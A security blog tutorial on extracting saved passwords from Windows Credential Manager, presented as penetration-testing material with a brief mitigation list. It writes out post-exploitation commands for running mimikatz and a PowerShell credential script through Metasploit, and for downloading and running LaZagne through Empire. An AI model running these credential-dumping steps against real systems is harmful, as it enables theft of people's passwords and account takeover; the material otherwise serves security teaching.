<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: Windows Credential Manager</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-windows-credential-manager/" rel="bookmark"><time class="entry-date published" datetime="2020-04-03T08:05:35+00:00">April 3, 2020</time><time class="updated" datetime="2025-05-10T19:48:30+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we learn about dumping system credentials by exploiting credential manager. We will talk about various methods today which can be used in both internal and external penetration testing.</span></p>
<h3><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li><span style="color: #000000;">Introduction to credentials manager</span></li>
<li><span style="color: #000000;">Accessing credential manager</span></li>
<li><span style="color: #000000;">Metasploit</span></li>
<li><span style="color: #000000;">Empire</span></li>
<li><span style="color: #000000;">Credentialfileview</span></li>
<li><span style="color: #000000;">PowerShell</span></li>
<li><span style="color: #000000;">Mitigation</span></li>
<li><span style="color: #000000;">Conclusion</span></li>
</ul>
<h3><span style="color: #800000;">Introduction to Credential Manager</span></h3>
<p><span style="color: #000000;">Credential Manager was introduced with Windows 7. It is like a digital vault to keep all of your credentials safe. All of the credentials are stored in a credentials folder which you will find at this location – <strong>%Systemdrive%\Users\&lt;Username&gt;\AppData\Local\Microsoft\Credentials</strong> and it is this folder that credential manager accesses. it also allows you to add, edit, delete, backup and even restore the passwords.</span></p>
<p><span style="color: #000000;">Credentials saved in credential manager are of two types:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Web credentials</strong>: As Edge and widows are the product of the same company, credentials manager has access to the stored information of Edge browser too, in order to increase safekeeping of saved credentials. It also stores the password of order application provided by Microsoft such as skype, Microsoft office, etc.</span></li>
<li><span style="color: #000000;"><strong>Windows credentials</strong>: Under this category, all the windows login credentials can be found. Along with any system that is connected in the network.</span></li>
</ul>
<p><span style="color: #000000;">Applications which are run by windows and has your credentials saved will automatically be saved in credential manager. Even when you update them, change is noted by and updated in credential manager too.</span></p>
<h3><span style="color: #800000;">Accessing Credential Manager</span></h3>
<p><span style="color: #000000;">To access credential manager, you can simply search it up in the start menu or you can access it bu two of the following methods:</span></p>
<ul>
<li><span style="color: #000000;">You can open <strong>control panel &gt; user accounts &gt; credential manager</strong></span></li>
<li><span style="color: #000000;">You can also access it through the command line with the command <strong>vaultcmd</strong> and its parameters.</span></li>
</ul>
<p><span style="color: #000000;">When you connect to another system in the network as using any method like in the following image:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pBTt0DpDAMw/Xobr3S9_oOI/AAAAAAAAjYA/T1RdJ8cn--cNspW3ZFIJetjiE7EJy_YKQCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">And while connecting when you provide the password and store it for later use too then these credentials are saved in credential manager.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wUi97s69WWs/Xobr4hcfdoI/AAAAAAAAjYY/bZVKAhKuzqYLXfMLioq3iKuR3VbmkUWrgCLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Irrespective of website and its security, when you save any password in the edge or any other application such as skype or outlook, it’s password too gets saved in credential manager. For instance, we have stored Gmail’s password in our practice as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-M0PPoR3ngiA/Xobr5A6h5_I/AAAAAAAAjYc/fS1mYA4WJGw1FHLrX-nn_EoJEenIODquQCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">You can confirm from the following image that the password is indeed saved.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rp2e0wecxFI/Xobr5odLuhI/AAAAAAAAjYg/lQOebelGvNAa_BL5zJipUG04_MNbwnXPACLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">And now, when you access credential manager, using any method, you will find that in windows credentials tab all the system, network passwords are stored.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q6ouu1iC0i0/Xobr6ZzPvuI/AAAAAAAAjYk/aW9cMN6WbuAIoh8DSXRmFMERuK8nn2xkgCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">And under the web credentials tab there are will be application’s passwords and the passwords saved in edge will be saved.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j83-sqwm5OE/Xobr6cbgqqI/AAAAAAAAjYo/5INt2aaZJm8Gbjaezk19yFv4gVMmbVSjQCLcBGAsYHQ/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Metasploit</span></h3>
<p><span style="color: #000000;">Now all these credentials can be dumped with simple methods. Once you have a session through Metasploit, all you have to do is upload mimikatz and run it. Mimikatz is an amazing credential dumping tool. We have covered mimikatz in detail in one our previous articles, to read that article click <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/understanding-guide-mimikatz/">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">And to run mimikatz remotely through Metasploit session, use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/Desktop/mmikatz.exe
shell
cd &lt;location of the uploaded file in the target system&gt;
mimikatz.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A6mwOJl6CxI/Xobr6levImI/AAAAAAAAjYs/uOhmOBMFOsw2sMoOD6JOcadR8Uwi9cIVQCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">And once the mimikats is executed successfully, you will get credentials from cred manager as shown in the image above.</span></p>
<h3><span style="color: #800000;"><strong>Empire</strong></span></h3>
<p><span style="color: #000000;">Similarly, while using empire, you can dump the credentials by downloading Lazagne.exe directly in the target system and then manipulatinthe lagazne.exe file to get all the credentials. LaZange is on eof the best credential dumping tool. We have covered LaZagne in detail in one our previous articles, to read that article click <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">Use the following commands to dump the credentials with this method :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell wget https://github.com/AlessandrZ/LaZagne/releases/download2.4.3/lazagne.exe -outfile lazagne.exe
shell wget
shell dir
shell ./lazagne.exe all</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f_I-u1LLH8Y/Xobr7ZVf04I/AAAAAAAAjYw/rD7lUjE_wSAj1NYtCR29aBmkFoXxJwMGACLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">After the execution of commands, you can see that the passwords have been retrieved as shown in the following image:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1hDCB2nnm6U/Xobr3cjaxGI/AAAAAAAAjYE/FjlLL5Lf7L4iviiLDmRUH3qcX9IVHgSYwCLcBGAsYHQ/s1600/10.png"/></span></p>
<h3><span style="color: #800000;">CredentialsFileView</span></h3>
<p><span style="color: #000000;">Our next method is using a third-party tool, i.e. credentialfileview. This tool is very effective when it comes to internal penetration testing. To use this tool, simply download it and launch it. After launching itself, it will ask you for the windows password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0Eeum_hRRe4/Xobr3TEE0SI/AAAAAAAAjYI/_GGgtBdSbOUk7mDmfaM7Ya3OtkFqMpQ2wCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Once you provide the password, it will give you all the credentials you need as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mda46rRf7GQ/Xobr30X5h6I/AAAAAAAAjYM/ei7dB9YhERce7pP9HMh49YnJehvcrPEwACLcBGAsYHQ/s1600/12.png"/></span></p>
<h3><span style="color: #800000;">Windows PowerShell</span></h3>
<p><span style="color: #000000;">This method of password dumping can prove itself useful in both internal and external pentesting. In this method, you have to run a script in windows powershell. You will find the script here. And once you run the script you will have all the web credentials as shown in the image below:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N-YCUSw55vM/Xobr4E6TK0I/AAAAAAAAjYQ/yBkabkRrewQjKarsTgxhWn4DiNDrxRifwCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">You can also use powershell remotely to dump credentials with the help of Metasploit. It is very simple as you just have to run a combination of following commands after you have your session:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load powershell
powershell_import /root/Get-WebCredentials.ps1
powershell_execute Get-WebCredentials</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-614GlwR0trQ/Xobr4U5OwcI/AAAAAAAAjYU/GPzEmxF9RP0v9IWRMnUxiw_B7xESAsB8QCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">And just like that with the help of powershell commands, you will have the desired credentials.</span></p>
<h3><span style="color: #800000;"><strong>Mitigation</strong></span></h3>
<p><span style="color: #000000;">Following are the measures you can use to keep your passwords safe:</span></p>
<ul>
<li><span style="color: #000000;">DO NOT save passwords in your system, browser or any other application</span></li>
<li><span style="color: #000000;">Use different passwords for every account</span></li>
<li><span style="color: #000000;">If you have trouble remembering passwords then instead of keeping them in clear text in your system, use an online password manager to keep them safe.</span></li>
<li><span style="color: #000000;">Use the latest version of the operating system and applications.</span></li>
<li><span style="color: #000000;">Manually go to the login page instead of following a link.</span></li>
<li><span style="color: #000000;">Keep firewall/defender enabled</span></li>
<li><span style="color: #000000;">Keep you employees/employers aware</span></li>
</ul>
<h3><span style="color: #800000;">Conclusion  </span></h3>
<p><span style="color: #000000;">As you have noticed from our article the even though this feature of credential manager that is provided by windows is convenient, it is not secure and once the attacker has the access of your system then these credentials are waiting to be theirs as there is no security layer added to credential manager. It is important to be aware of every feature your operating system is providing just so you can save yourself. Hence, it is important to know how to access the credential manager and how to operate it and how it can be exploited.</span></p>
<p><span style="color: #000000;">We live in a cyber active world and there are login credentials for everything, one can’t remember every credential ever. Though credential manager is utility makes it easy for us and takes the responsibility of saving the passwords, but at what expense?</span></p>
<p><span style="color: #000000;">We at Hacking Articles want to request everyone to stay at home and self-quarantine yourself for the prevention against the spread of the Covid-19. Take Care and be Healthy and Keep Hacking!!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <span style="color: #0000ff;"><strong><a class="broken_link" style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
